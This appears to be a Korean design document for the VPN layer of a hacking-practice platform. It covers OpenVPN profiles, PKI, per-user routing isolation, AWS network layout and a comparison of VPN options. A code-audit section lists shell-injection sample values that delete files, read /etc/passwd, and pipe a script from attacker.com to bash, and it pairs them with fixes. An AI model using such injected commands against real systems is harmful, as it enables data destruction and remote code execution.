# HackThisOut 3.0  -VPN

## HackThisOut 버전별 진화

```
1.0  기본 모의 해킹 플랫폼
     └── VPN + 취약 머신 접속 + 기본 힌트 시스템

2.0  실시간 아레나 경쟁 플랫폼  ← 현재
     └── Socket.io 아레나 + 상점/아이템 + 사이버펑크 UI

3.0  LLM 기반 보안 학습 시스템  ← 목표
     └── 백준 스타일 문제은행 + AI 문제 생성/채점 + 전 학과 대상 확장
```

3.0은 단순 경쟁 플랫폼을 넘어 **AI가 문제를 생성하고 채점하는 보안 학습 시스템**이다.
모든 학과 학생이 사용하는 만큼 VPN 인프라의 **안정성, 확장성, 자동화**가 핵심 과제가 된다.

## 1. VPN 개요 및 역할

### Hack This Out 3.0에서 VPN이 필요한 핵심 이유

HackThisOut은 **의도적으로 취약한 머신**을 사용자에게 제공하는 플랫폼이다.
이 취약한 머신을 인증된 사용자만 접근하도록 막는 것이 VPN의 핵심 역할이다.

```
인터넷 (누구나 접근 가능)
        ↓
   [VPN 장벽]  ← 인증된 사용자만 통과
        ↓
  AWS VPC 내부 사설망
        ↓
  취약한 Target Machine (10.10.x.x 대역)
```

### VPN 없이 운영할 경우 발생하는 문제

| 문제 | 설명 |
|------|------|
| 머신 노출 | 취약한 머신이 인터넷에 그대로 노출 |
| 무단 접근 | 외부 해커가 플랫폼 밖에서 머신 공격 가능 |
| 법적 문제 | 의도치 않은 피해 발생 시 법적 책임 |
| 비용 폭증 | 봇 트래픽, DDoS로 AWS 비용 급증 |

### Hack This Out에서 VPN의 역할

```
격리     → 취약 머신을 외부로부터 보호
인증     → 접속자 신원 보증 (인증서 기반)
추적     → 부정행위 및 이상 행동 감지
제어     → 아레나/학습 세션 시간에 맞춰 접근 권한 on/off
법적보호  → 안전한 실습 환경임을 증명하는 접속 로그
```

## 2. VPN 동작 원리

### VPN의 본질 — 터널링(Tunneling)

VPN의 본질은 공개된 인터넷 위에 나만의 **암호화된 비밀 통로**를 만드는 것이다.
외부에서 보면 VPN 서버와 통신하는 것만 보이고, 실제 목적지(취약한 머신)는 보이지 않는다.

```
일반 인터넷 통신:
내 PC ──────────────────────────────── 목적지 서버
       (패킷이 암호화 없이 인터넷을 지나감)
       (중간에서 누구나 내용을 볼 수 있음)

VPN 통신:
내 PC ── [암호화] ── VPN 서버 ── [복호화] ── 목적지 서버
          ↑                    ↑
      터널 시작             터널 종료
      (외부에서 내용 불가)
```

### 패킷이 실제로 이동하는 과정

```
1단계: 내 PC에서 머신(10.10.1.5)에 패킷 전송
            ↓
2단계: 운영체제가 라우팅 테이블 확인
       "10.10.x.x 대역은 tun0(VPN 인터페이스)로 보내라"
            ↓
3단계: OpenVPN이 패킷을 AES-256으로 암호화
            ↓
4단계: 암호화된 패킷을 VPN 서버(AWS EC2)로 UDP 전송
            ↓
5단계: VPN 서버가 패킷 복호화 후 내부 네트워크로 전달
            ↓
6단계: Private Subnet의 Target Machine에 도착
            ↓
7단계: 응답 패킷이 역순으로 내 PC에 도달
```

### TUN vs TAP 방식

OpenVPN은 TUN/TAP 두 가지 방식으로 동작한다. Hack This Out은 `dev tun`을 사용한다.

| 방식 | 계층 | 특징 | HackThisOut 적합성 |
|------|------|------|-------------------|
| TUN | L3 (IP) | IP 패킷 터널링, 가상 랜카드 생성 | ✅ 채택 (HTB 방식 동일) |
| TAP | L2 (이더넷) | 이더넷 프레임 터널링, 브리지 네트워킹 | ❌ 불필요 |

**TUN 방식이란:**
- 운영체제에 가상 네트워크 인터페이스(`tun0`) 생성
- 이 가상 랜카드에 VPN 내부 IP가 할당됨
- 머신(10.10.x.x)으로의 패킷이 자동으로 `tun0`를 통해 VPN 터널로 진입

```
내 PC의 네트워크 인터페이스 (VPN 연결 후):
eth0  → 192.168.0.10  (실제 랜카드, 일반 인터넷용)
tun0  → 10.10.14.5    (가상 랜카드, VPN/머신 접속용)
```

### Split Tunneling — Hack This Out 핵심 설정

```
Full Tunnel (일반 VPN 서비스 방식):
모든 트래픽 → VPN 서버 경유
→ 유튜브, 카카오톡도 VPN을 통해 느려짐
→ 학습 중 불필요한 병목 발생

Split Tunnel (Hack This Out 방식):
머신 트래픽(10.10.x.x)만 → VPN 터널
일반 인터넷 트래픽 → 기존 경로 유지
→ 학습/실습 중에도 일반 인터넷 정상 사용 가능
```

**라우팅 테이블 변화:**

VPN 연결 전:
```
목적지           게이트웨이      인터페이스
0.0.0.0/0       192.168.0.1    eth0   ← 모든 트래픽이 공유기로
192.168.0.0/24   직접연결       eth0
```

VPN 연결 후 (Split Tunnel):
```
목적지           게이트웨이      인터페이스
0.0.0.0/0       192.168.0.1    eth0   ← 일반 인터넷은 기존 경로 유지
10.10.0.0/16    10.8.0.1       tun0   ← 머신 트래픽만 VPN으로
10.8.0.0/24      직접연결       tun0
192.168.0.0/24   직접연결       eth0
```

## 3. .ovpn 프로파일 설정 분석

`generateVPNProfile.ts`가 생성하는 각 설정값의 의미:

### 연결 기본 설정

```
client           → 나는 서버가 아닌 클라이언트 모드로 동작
dev tun          → TUN 방식 사용 (L3 IP 터널, 가상 랜카드 생성)
proto udp        → UDP 프로토콜 사용
                   TCP보다 오버헤드가 적어 실시간 해킹 실습에 적합
                   단, 패킷 손실 가능성 있음 (TCP는 재전송 보장)
remote {IP} 1194 → VPN 서버 IP 주소와 포트 번호
                   1194는 OpenVPN 기본 포트
```

### 핵심 보안 설정

```
remote-cert-tls server
  → 서버 인증서의 용도(extended key usage)를 반드시 검증
  → 이 설정 없으면 클라이언트 인증서로 서버 사칭 가능 (MITM 공격)
  → 반드시 포함해야 하는 설정

cipher AES-256-CBC
  → 256비트 AES 암호화 사용 (군사급)
  → CBC(Cipher Block Chaining) 모드: 각 블록이 이전 블록에 의존
  → 현재는 AES-256-GCM 권장 (인증 기능 포함으로 더 안전)

tls-auth ta.key
  → 모든 OpenVPN 패킷에 HMAC(Hash-based Message Authentication Code) 서명 추가
  → ta.key 없는 패킷은 TLS 핸드셰이크 전에 즉시 드롭
  → VPN 서버 포트 자체를 외부에서 안 보이게 하는 효과

key-direction 1
  → tls-auth에서 HMAC 방향 설정
  → 클라이언트는 1, 서버는 0 사용
  → 방향이 다르면 연결 불가 (단방향 인증 강화)
```

### tls-auth (ta.key)의 역할 상세

```
ta.key 없을 때:
인터넷의 누구나 VPN 서버 포트 1194에 패킷 전송 가능
    ↓
DDoS 공격으로 VPN 서버 마비 가능
포트스캔으로 VPN 서버 존재 탐지 가능
무차별 TLS 연결 시도로 서버 부하 발생

ta.key 있을 때:
올바른 HMAC 서명이 없는 패킷 → 즉시 드롭 (TLS도 시작 안 함)
    ↓
DDoS 패킷이 서버에 도달해도 처리 비용 최소화
포트스캔에 응답하지 않아 서버 자체가 안 보이는 효과
정상 클라이언트만 TLS 핸드셰이크 진입 가능
```

### 연결 안정성 설정

```
resolv-retry infinite
  → DNS로 VPN 서버 주소 조회 실패 시 무한 재시도
  → IP 대신 도메인으로 서버 지정 시 필요
  → 네트워크 불안정 환경에서 자동 복구

persist-key
  → 재연결 시 TLS 키를 재사용 (재생성 없이)
  → 연결 끊김 후 재접속 속도 향상
  → 학습 중 네트워크 불안정으로 끊겼을 때 빠른 재연결

persist-tun
  → 재연결 시 tun0 인터페이스를 유지 (재생성 없이)
  → IP 주소 변경 없이 재연결 가능
  → 진행 중인 해킹 세션이 끊겼을 때 복구 용이

nobind
  → 클라이언트 측 포트를 특정 포트에 고정하지 않음
  → 동적 포트 할당으로 방화벽 통과 용이
```

### generateVPNProfile.ts 보안 문제점

현재 코드의 주요 취약점:

| 등급 | 문제 | 설명 |
|------|------|------|
| 🔴 치명 | Shell Injection | `clientName` 미검증으로 임의 명령 실행 가능 |
| 🔴 치명 | `exec()` 사용 | 멀티라인 명령 실행 순서 보장 없음 |
| 🟠 중간 | 환경변수 미검증 | `VPN_SERVER_IP` 없을 시 `undefined` 삽입 |
| 🟡 낮음 | 디렉토리 미확인 | 프로파일 디렉토리 없을 시 파일 생성 실패 |

**Shell Injection 예시:**
```
// clientName에 악의적 입력이 들어오면
clientName = "user; rm -rf /home/ubuntu/openvpn-ca"
clientName = "user && cat /etc/passwd"
clientName = "user$(curl attacker.com/shell.sh | bash)"
```

해킹 플랫폼 특성상 **공격적 성향의 사용자**가 많으므로 반드시 수정 필요.

**개선 방향:**
```
1. clientName 정규식 검증  →  /^[a-zA-Z0-9_-]{3,32}$/
2. exec() → execFile()로 교체  →  인자를 배열로 전달하여 Shell 우회
3. VPN_SERVER_IP 환경변수 사전 검증  →  undefined 삽입 방지
4. 프로파일 디렉토리 fs.mkdirSync() 보장  →  디렉토리 없을 시 자동 생성
5. 파일 권한 0o600 설정  →  소유자만 읽기 가능
```

## 4. PKI (Public Key Infrastructure)

### 비대칭 암호화 기초

PKI를 이해하려면 먼저 **비대칭 암호화**를 알아야 한다.

```
대칭 암호화 (구식):
암호화 키 == 복호화 키 (같은 키 사용)
문제: 키를 상대방에게 전달하는 과정 자체가 위험
     → 전달 중 탈취되면 모든 암호화 의미 없음

비대칭 암호화 (PKI 기반):
공개키(Public Key)  → 누구에게나 공개, 암호화에 사용
개인키(Private Key) → 절대 비공개, 복호화에만 사용
→ 공개키는 탈취당해도 복호화 불가 (개인키 없이는)
```

**핵심 원리:**
```
A가 B에게 비밀 메시지 전송:
1. B의 공개키를 받음 (누구나 알 수 있음)
2. B의 공개키로 메시지 암호화
3. 암호화된 메시지 전송
4. B만 가진 개인키로 복호화
→ 중간에 누가 가로채도 개인키 없이는 절대 못 읽음
```

### PKI의 신뢰 구조

PKI의 핵심 문제: **"이 공개키가 진짜 그 사람 것인지 어떻게 믿는가?"**

```
악의적 공격자가 공개키를 위조한다면?
공격자 → "저의 공개키입니다" (실제로는 공격자 공개키)
         → 사용자가 공격자 공개키로 암호화
         → 공격자가 읽을 수 있음 (MITM 공격)

CA(Certificate Authority)가 이 문제를 해결:
CA = 공증 기관 (모두가 신뢰하는 제3자)
  ↓
"이 공개키는 진짜 이 사람 것임을 보증합니다" + CA 서명
  ↓
인증서(Certificate) = 공개키 + 소유자 정보 + CA 서명
```

**실생활 비유:**

| PKI 개념 | 실생활 비유 |
|----------|------------|
| 인증서 | 여권 |
| CA | 정부 (외교부) |
| 사용자 | 여권 소지자 |
| 공개키 | 여권의 사진/개인정보 |
| CA 서명 | 정부 직인/홀로그램 |
| CRL | 분실/위조 여권 블랙리스트 |

### Hack This Out의 PKI 구조

```
                    [CA]
                ca.crt + ca.key
                (최상위 신뢰 기관)
                /              \
               /                \
      [서버 인증서]          [클라이언트 인증서]
      server.crt               user1.crt
      server.key               user1.key
      (VPN 서버 신원 증명)      user2.crt
                               user2.key
                               ...
                               (각 사용자 신원 증명)
```

### Easy-RSA 파일 구조

Easy-RSA는 PKI를 쉽게 관리하기 위한 도구다.

```
pki/
├── ca.crt              → CA 인증서 (모두에게 공개 가능)
├── ca.key              → CA 개인키 (절대 노출 금지 — 탈취 시 전체 PKI 붕괴)
├── issued/
│   ├── user1.crt       → 사용자1 인증서 (CA가 서명한 공개키)
│   └── user2.crt       → 사용자2 인증서
├── private/
│   ├── user1.key       → 사용자1 개인키 (사용자에게만 전달)
│   └── user2.key       → 사용자2 개인키
├── reqs/
│   └── user1.req       → 인증서 서명 요청서 (CSR, 중간 단계 파일)
└── crl.pem             → 폐기된 인증서 목록 (Certificate Revocation List)
```

### 인증서 발급 흐름

```
사용자 가입
    ↓
easyrsa gen-req user1 nopass
→ user1.key 생성 (개인키, 사용자 PC에만 존재해야 함)
→ user1.req 생성 (CSR: 공개키 + 사용자 정보, CA에 제출)
    ↓
easyrsa sign-req client user1
→ CA가 user1.req의 내용을 검증
→ CA의 개인키(ca.key)로 서명
→ user1.crt 발급 (서명된 인증서)
    ↓
.ovpn 프로파일에 포함:
  <ca>      ca.crt  </ca>      ← 서버 검증용
  <cert>    user1.crt </cert>  ← 클라이언트 신원 증명
  <key>     user1.key </key>   ← 클라이언트 개인키
  <tls-auth> ta.key </tls-auth> ← HMAC 서명용
```

### VPN 연결 시 TLS Handshake 과정

```
클라이언트                              VPN 서버
    │                                      │
    │──── ClientHello (연결 요청) ────────→│
    │     (지원하는 암호화 방식 목록 포함)  │
    │                                      │
    │←─── ServerHello + server.crt ────────│
    │     (서버가 선택한 암호화 방식 +      │
    │      서버 인증서 전달)                │
    │                                      │
    │  [클라이언트: CA로 서버 인증서 검증]  │
    │  ca.crt로 server.crt의 서명 확인     │
    │  서명 유효 → 진짜 HackThisOut 서버   │
    │  서명 무효 → 연결 즉시 차단           │
    │                                      │
    │──── user.crt (클라이언트 인증서) ───→│
    │                                      │
    │     [서버: CA로 클라이언트 인증서 검증]│
    │     ca.crt로 user.crt 서명 확인      │
    │     CRL 확인 → 폐기된 인증서인지 확인 │
    │     검증 성공 → 허가된 사용자 확인    │
    │                                      │
    │←──── 검증 완료, 세션키 교환 ──────────│
    │                                      │
    │══════════ 암호화된 VPN 터널 ══════════│
    │          (AES-256-CBC 적용)           │
```

### 인증서 폐기 (Revoke) 메커니즘

아레나 종료, 계정 정지, 치팅 감지 시 즉시 접근 차단에 사용된다.

```
정상 흐름:
VPN 서버 → CRL 확인 → 인증서 유효 → 접속 허용

폐기 흐름:
easyrsa revoke user1   → user1.crt를 CRL에 등록
easyrsa gen-crl        → crl.pem 파일 갱신
VPN 서버 설정에 crl-verify crl.pem 적용
    ↓
이후 user1 접속 시도
VPN 서버 → CRL 확인 → user1.crt 폐기됨 → 접속 거부
```

**CRL (Certificate Revocation List):**
```
┌─────────────────────────────────┐
│     폐기된 인증서 목록 (crl.pem)  │
├─────────────────────────────────┤
│ 일련번호 01 - 2025.03.01 폐기    │
│ 일련번호 07 - 2025.04.15 폐기    │
│ 일련번호 12 - 2025.05.20 폐기    │
└─────────────────────────────────┘
VPN 서버는 연결 시마다 이 목록을 확인
```

### 인증서 vs 아이디/비밀번호 비교

| 구분 | 아이디/비밀번호 | 인증서 방식 |
|------|----------------|-------------|
| 탈취 위험 | 높음 (피싱, 브루트포스) | 매우 낮음 (개인키 필요) |
| 계정 차단 | DB에서 비활성화 | CRL에 인증서 등록 |
| 자동화 | 어려움 | easyrsa 스크립트로 쉬움 |
| 사용자 추적 | 로그인 기록 | VPN 접속 로그 (인증서 기준) |
| 3.0 확장성 | 대량 계정 관리 어려움 | 자동 발급/폐기 스크립트 가능 |

## 5. 라우팅 (Routing)

### 라우팅이란

패킷이 목적지까지 가는 **경로를 결정**하는 것.
내 PC는 패킷을 보낼 때마다 라우팅 테이블을 확인하여 어떤 인터페이스로 내보낼지 결정한다.

```
내 PC에서 10.10.1.5로 패킷 전송 시:

라우팅 테이블 확인
    ↓
"10.10.0.0/16 대역은 tun0(VPN)으로 보내라" 규칙 발견
    ↓
패킷을 tun0로 전달 → OpenVPN이 암호화
    ↓
암호화된 패킷을 VPN 서버(AWS EC2)로 UDP 전송
    ↓
VPN 서버가 복호화 후 내부 네트워크로 라우팅
    ↓
Private Subnet의 Target Machine(10.10.1.5) 도착
```

### 사용자 간 격리 라우팅 (client-config-dir)

HackThisOut에서 사용자 A가 사용자 B의 머신에 접근하는 것을 막는 핵심 설정이다.

```
VPN 서버 메인 설정:
client-config-dir /etc/openvpn/ccd
# 사용자별 개별 설정 파일 디렉토리 지정

/etc/openvpn/ccd/user1 파일:
iroute 10.10.1.0 255.255.255.0
ifconfig-push 10.8.0.2 10.8.0.1
# user1에게 10.8.0.2 IP 할당, 10.10.1.x 대역만 라우팅

/etc/openvpn/ccd/user2 파일:
iroute 10.10.2.0 255.255.255.0
ifconfig-push 10.8.0.3 10.8.0.1
# user2에게 10.8.0.3 IP 할당, 10.10.2.x 대역만 라우팅
```

**결과:**
```
user1 (VPN IP: 10.8.0.2)
  → 10.10.1.x (본인 머신)  접근 가능 ✅
  → 10.10.2.x (user2 머신) 접근 시도 → 라우팅 규칙 없음 → 드롭 ❌

user2 (VPN IP: 10.8.0.3)
  → 10.10.2.x (본인 머신)  접근 가능 ✅
  → 10.10.1.x (user1 머신) 접근 시도 → 라우팅 규칙 없음 → 드롭 ❌
```

### iptables 이중 차단

라우팅만으로 부족할 때 방화벽으로 한 번 더 막는다.

```
1차 방어 (라우팅):
잘못된 대역으로 패킷 전송 → 경로 없음 → 드롭

2차 방어 (iptables):
패킷이 어떻게든 라우팅을 통과해도 → 방화벽 규칙으로 차단

HackThisOut 적용 규칙 개념:
규칙 1: user1의 VPN IP(10.8.0.2) → 10.10.1.x 허용
규칙 2: user1의 VPN IP(10.8.0.2) → 그 외 대역 전부 차단
규칙 3: VPN 대역(10.8.0.0/24) → 백엔드 서버 접근 차단
규칙 4: VPN 대역(10.8.0.0/24) → 인터넷 직접 접근 차단
```

### 아레나/학습 세션 라우팅 시나리오

```
세션 시작 전:
사용자 → 어떤 머신도 접근 불가 (ccd 파일 없음)

세션 시작 (아레나 or 3.0 학습 문제 시작):
서버 → 해당 사용자 ccd 파일 생성
      → iroute 10.10.{userId}.0/24 추가
      → 해당 사용자가 할당된 머신 접근 가능

세션 종료 (아레나 끝 or 문제 제출 완료):
서버 → ccd 파일 삭제 또는 인증서 revoke
      → 해당 머신 접근 즉시 불가
      → EC2 인스턴스 종료 → 비용 절감
```

## 6. AWS VPC 구조

### VPC란

**Virtual Private Cloud** — AWS 안에 만드는 나만의 가상 데이터센터.
다른 AWS 사용자들의 네트워크와 완전히 격리된 독립적인 가상 네트워크 공간이다.

```
AWS 전체 인프라
┌───────────────────────────────────────────┐
│                                           │
│   Hack This Out VPC (10.0.0.0/16)         │
│   ┌───────────────────────────────────┐   │
│   │  내부 서버들 (외부에서 직접 불가)     │   │
│   └───────────────────────────────────┘   │
│                                           │
│   다른 회사 VPC (완전히 격리됨)              │
│   ┌───────────────────────────────────┐   │
│   │  서로의 존재조차 알 수 없음          │    │
│   └───────────────────────────────────┘   │
└───────────────────────────────────────────┘
```

### Public / Private Subnet 구조

```
HackThisOut VPC (10.0.0.0/16)
│
├── Public Subnet (10.0.1.0/24)
│   ├── Internet Gateway 연결됨 → 인터넷 양방향 통신 가능
│   ├── EC2: VPN 서버 (UDP 1194만 외부 오픈)
│   ├── EC2: Backend (Express/Node.js)
│   └── EC2: Frontend (React)
│
└── Private Subnet (10.0.2.0/24)
    ├── Internet Gateway 없음 → 인터넷 직접 접근 완전 불가
    ├── EC2: Target Machine 1 (Vulnhub 기반)
    ├── EC2: Target Machine 2 (커스텀 취약 머신)
    ├── EC2: Target Machine 3 (3.0 LLM 생성 문제용)
    └── EC2: MongoDB 서버
```

**핵심:**
```
Public Subnet:
외부 → VPN 서버 O  (UDP 1194 포트만 허용)
외부 → 취약 머신 X (접근 자체 불가)

Private Subnet:
외부에서 직접 접근 절대 불가
VPN 연결 사용자만 → VPN 서버를 통해서만 접근 가능
```

### Internet Gateway vs NAT Gateway

| 구분 | Internet Gateway | NAT Gateway |
|------|-----------------|-------------|
| 트래픽 방향 | 양방향 (인터넷 ↔ AWS) | 단방향 (AWS → 인터넷만) |
| 외부에서 직접 접근 | 가능 | 불가 |
| 주요 사용처 | Public Subnet, VPN/Web 서버 | Private Subnet 업데이트용 |
| HackThisOut 적용 | VPN/백엔드/프론트엔드 서버 | 취약 머신 패키지 업데이트 |

### Security Group 설정

Security Group은 AWS의 **인스턴스별 가상 방화벽**이다.

**VPN 서버 Security Group:**
```
인바운드 (허용):
UDP 1194  ← 0.0.0.0/0      VPN 클라이언트 연결 (전 세계)
TCP 22    ← 관리자 IP만      SSH 관리 접속

아웃바운드 (허용):
전체      → 모든 대역       VPN 트래픽 내부 전달
```

**Target Machine Security Group:**
```
인바운드 (허용):
모든 포트  ← 10.0.1.0/24만  VPN 서버 서브넷에서만 허용
           (인터넷 직접 접근 원천 차단)

아웃바운드 (허용):
전체      → 모든 대역
```

**백엔드 서버 Security Group:**
```
인바운드 (허용):
TCP 5000  ← 프론트엔드 서버 IP   API 요청
TCP 27017 ← 백엔드 서버 IP       MongoDB 접속
TCP 22    ← 관리자 IP만           SSH 관리

아웃바운드 (허용):
전체      → 모든 대역
```

### EC2 비용 최적화

```
EC2 인스턴스 상태:
running    → 시간당 비용 발생  (머신 사용 중)
stopped    → 스토리지 비용만   (머신 대기 중)
terminated → 비용 없음         (머신 삭제됨)
```

**HackThisOut 최적화 전략:**
```
머신 시작 버튼   → EC2 start    (stopped → running)
머신 사용 종료   → EC2 stop     (running → stopped)
아레나/세션 종료 → EC2 terminate + AMI 스냅샷 보관
                 → 다음 세션 시 스냅샷으로 재생성
                 → 3.0에서 문제별 머신 스냅샷 관리 필요
```

## 7. 보안 위협과 VPN 방어

### 외부 위협

```
위협: 외부 해커가 취약한 머신 직접 공격
방어: VPN 뒤 Private Subnet에 머신 배치
      → 인터넷에서 머신 IP 자체가 보이지 않음
      → Security Group으로 VPN 서버 이외 접근 차단
```

### 내부 위협 (사용자 간)

```
위협: 사용자 A가 사용자 B의 머신에 접근 (3.0에서 더 중요)
방어: client-config-dir로 사용자별 라우팅 제한
      + iptables로 이중 차단
      → 본인 할당 머신 IP 대역만 접근 허용
```

### 계정 탈취

```
위협: 탈취한 계정으로 VPN 접속
방어: 인증서 + 플랫폼 계정 이중 인증
      계정 정지 시 인증서 즉시 revoke
      → 인증서 없으면 VPN 연결 자체 불가
```

### 치팅 방지

```
위협: 세션 종료 후 계속 머신 접속해서 답 탈취
방어: 세션 종료 시 해당 사용자 인증서 revoke
      또는 OpenVPN management interface로 강제 연결 해제
      → 3.0에서 문제 제출 = 세션 종료 = VPN 차단 연동 필요
```

### 트래픽 모니터링

`/var/log/openvpn/status.log` 파싱으로 이상 행동 감지:

| 이상 패턴 | 의미 |
|-----------|------|
| 비정상적으로 많은 포트 스캔 트래픽 | 자동화 공격 도구 사용 의심 |
| 다른 사용자 IP 대역 접근 시도 | 타인 머신 침입 시도 |
| 세션 종료 후 접속 시도 | 치팅 시도 |
| 동일 계정 다중 VPN 접속 | 계정 공유 의심 |
| 비정상 트래픽 양 | 자동화 스크립트 의심 |

### 법적/윤리적 보호

```
- 취약 머신이 완전히 사설망 안에만 존재 → 외부 피해 없음
- 접속 기록이 남아 의도적 악용 여부 증명 가능
- 인증된 사용자만 접근 → 무단 침입이 아님을 증명
- 3.0에서 전 학과 학생 대상으로 확장 시 더욱 중요
```

## 8. Hack The Box vs Hack This Out 2.0 비교

Hack The Box는 Hack This Out이 참고한 레퍼런스 플랫폼이다.
두 플랫폼의 VPN 구조와 기능을 비교하여 Hack This Out의 차별점을 파악한다.

### VPN 구조 비교

| 구분 | Hack The Box | Hack This Out 2.0 |
|------|-----------|-----------------|
| VPN 솔루션 | OpenVPN + WireGuard (선택) | OpenVPN |
| 인증 방식 | 인증서 기반 PKI | 인증서 기반 PKI |
| 터널링 방식 | TUN / Split Tunnel | TUN / Split Tunnel |
| 머신 IP 대역 | 10.10.x.x | 10.10.x.x |
| 프로파일 발급 | 수동 다운로드 | 자동 발급 (generateVPNProfile.ts) |
| 사용자 격리 | 적용됨 | 구현 필요 |
| VPN 포트 | UDP 1194 (OpenVPN) / UDP 51820 (WireGuard) | UDP 1194 |

### 플랫폼 기능 비교

| 구분 | Hack The Box | Hack This Out 2.0 |
|------|-----------|-----------------|
| 실시간 경쟁 | ❌ 없음 | ✅ Socket.io 아레나 |
| 아레나 모드 | ❌ 없음 | ✅ 3가지 게임 모드 |
| VPN-게임 연동 | ❌ 없음 | ✅ 아레나 시작/종료 시 VPN 권한 연동 |
| 상점/아이템 | ❌ 없음 | ✅ HTO 코인, 룰렛 시스템 |
| LLM 문제 생성 | ❌ 없음 | ✅ Anthropic Claude SDK 연동 |
| 대상 사용자 | 전문가/CTF 참가자 | 전 학과 학생 (3.0 목표) |
| 학습 시스템 | 문제 풀이 중심 | 3.0: 백준 스타일 학습 시스템 |
| 오픈소스 | ❌ 상용 | ✅ MIT 라이선스 |

### HTB 대비 Hack This Out 2.0의 핵심 차별점

```
HTB의 VPN = 단순 머신 접속 수단
Hack This Out 2.0의 VPN = 게임 시스템의 일부

아레나 시작  → VPN 접근 권한 자동 부여
아레나 종료  → VPN 접근 권한 자동 회수
First Blood  → Socket.io 실시간 반영
치팅 감지    → VPN 강제 차단
```

## 9. VPN 솔루션 비교 — OpenVPN vs WireGuard

### 주요 VPN 종류

| VPN | 특징 | 구현 난이도 | HTB 사용 여부 |
|-----|------|------------|--------------|
| **OpenVPN** | 가장 범용적, 오랜 검증 | 중간 | ✅ |
| **WireGuard** | 최신, 빠름, 간단 | 쉬움 | ✅ |
| **IPSec** | 기업용, OS 내장 | 어려움 | ❌ |
| **SoftEther** | 다중 프로토콜 지원 | 중간 | ❌ |

### OpenVPN vs WireGuard 핵심 비교

| 구분 | OpenVPN | WireGuard |
|------|---------|-----------|
| 코드 라인 수 | ~70,000줄 | ~4,000줄 |
| 처리 속도 | 보통 | 훨씬 빠름 |
| 초기 연결 속도 | 느림 (TLS Handshake) | 빠름 (단순 키 교환) |
| 설정 복잡도 | 복잡 (인증서 기반) | 간단 (키 쌍만) |
| 인증 방식 | PKI 인증서 (CA 필요) | 공개키/개인키 쌍 |
| 암호화 알고리즘 | AES-256-CBC/GCM | ChaCha20-Poly1305 |
| 리눅스 커널 통합 | ❌ 유저스페이스 | ✅ 커널 5.6 이상 내장 |
| PKI 인프라 필요 | ✅ Easy-RSA 등 | ❌ |
| 개별 사용자 revoke | ✅ CRL 표준 메커니즘 | ❌ 공개키 삭제 방식 |
| 레퍼런스/문서 | 매우 풍부 | 비교적 적음 |

### 인증 방식 차이

**OpenVPN (PKI 인증서 방식):**
```
CA 구축 → 사용자별 인증서 발급 → .ovpn 파일 생성
user.key + user.crt + ca.crt + ta.key → 하나의 .ovpn 파일
```

**WireGuard (키 쌍 방식):**
```
사용자 공개키/개인키 생성 (wg genkey | tee private | wg pubkey > public)
서버에 사용자 공개키만 등록
→ .conf 파일 하나로 끝 (CA 불필요)
```

**WireGuard .conf 예시:**
```ini
[Interface]
PrivateKey = 사용자_개인키
Address = 10.10.14.5/24

[Peer]
PublicKey = 서버_공개키
Endpoint = VPN_SERVER_IP:51820
AllowedIPs = 10.10.0.0/16
# OpenVPN의 route-nopull과 동일한 Split Tunnel 효과
PersistentKeepalive = 25
```

### Revoke 방식 차이 (세션 연동 핵심)

**OpenVPN Revoke:**
```
세션 종료
    ↓
easyrsa revoke user1   → CRL에 등록
easyrsa gen-crl        → crl.pem 갱신
    ↓
이후 연결 시도 → VPN 서버가 CRL 확인 → 즉시 거부
표준화된 메커니즘, 자동화 용이
```

**WireGuard Revoke:**
```
세션 종료
    ↓
wg set wg0 peer {user1_공개키} remove
    ↓
해당 사용자 연결 즉시 끊김
별도 API/스크립트 직접 구현 필요
```

## 9. VPN 솔루션 비교 — OpenVPN vs WireGuard
 
### 주요 VPN 종류
 
| VPN | 특징 | 구현 난이도 | HTB 사용 여부 |
|-----|------|------------|--------------|
| **OpenVPN** | 가장 범용적, 오랜 검증 | 중간 | ✅ |
| **WireGuard** | 최신, 빠름, 간단 | 쉬움 | ✅ |
| **IPSec** | 기업용, OS 내장 | 어려움 | ❌ |
| **SoftEther** | 다중 프로토콜 지원 | 중간 | ❌ |
 
### IPSec이 맞지 않는 이유
 
**설계 목적 자체가 다릅니다:**
```
IPSec 설계 목적:
기업 네트워크 ↔ 기업 네트워크 연결
(본사 ↔ 지사, 서버 ↔ 서버)
 
HackThisOut 목적:
개인 사용자 PC → 취약 머신 접속
(불특정 다수 학생 → 개별 머신)
```
 
**운영체제 의존성 문제:**
```
OpenVPN/WireGuard:
별도 클라이언트 설치 → 어느 OS든 동일하게 동작
 
IPSec:
운영체제 내장 방식으로 동작
→ Windows, macOS, Linux마다 설정 방식이 전부 다름
→ 학생들 OS 환경이 다양한 HackThisOut에서 지원 비용 폭증
```
 
**방화벽 통과 문제:**
```
IPSec 사용 포트:
UDP 500  (IKE 키 교환)
UDP 4500 (NAT 통과)
ESP 프로토콜 (IP 프로토콜 50번)
 
문제:
ESP 프로토콜은 학교/기숙사 방화벽에서 자주 차단됨
→ 학생 환경에 따라 VPN 연결 자체가 불가능한 경우 발생
```
 
### SoftEther가 맞지 않는 이유
 
**과도한 기능이 오히려 문제:**
```
SoftEther가 지원하는 프로토콜:
OpenVPN, L2TP, SSTP, EtherIP, L2TPv3 ...
→ 여러 프로토콜을 하나로 묶어서 제공하는 멀티 프로토콜 VPN
 
HackThisOut에 필요한 건:
OpenVPN 또는 WireGuard 하나면 충분
→ 불필요한 복잡도만 증가
```
 
**레퍼런스 부족:**
```
OpenVPN  : 전 세계 수천 개 보안 플랫폼에서 사용
WireGuard: HTB 포함 빠르게 표준화 중
SoftEther: 보안 실습 플랫폼에서 사용 사례 거의 없음
           → 문제 발생 시 참고할 자료가 없음
```
 
**개발/유지보수 불확실성:**
```
OpenVPN  : 오픈소스, 수십 년간 꾸준히 유지보수
WireGuard: 리눅스 커널에 공식 통합, 장기 지원 확실
SoftEther: 일본 대학 연구 프로젝트로 시작
           → 장기 유지보수 불확실
           → 커뮤니티 규모 작음
```
 
### 4가지 VPN 최종 비교
 
| 구분 | OpenVPN | WireGuard | IPSec | SoftEther |
|------|---------|-----------|-------|-----------|
| 설계 목적 | 개인 사용자 VPN | 개인 사용자 VPN | 기업 네트워크 간 | 멀티 프로토콜 |
| HackThisOut 적합성 | ✅ | ✅ | ❌ | ❌ |
| 학생 환경 호환성 | 높음 | 높음 | 낮음 (방화벽 차단) | 보통 |
| 보안 플랫폼 레퍼런스 | 매우 많음 | 많음 | 거의 없음 | 거의 없음 |
| 유지보수 안정성 | 매우 높음 | 높음 | 높음 | 불확실 |
| 개인 사용자 관리 | 쉬움 | 쉬움 | 어려움 | 복잡 |
 
> IPSec은 목적이 다르고, SoftEther는 불필요하게 복잡하다.
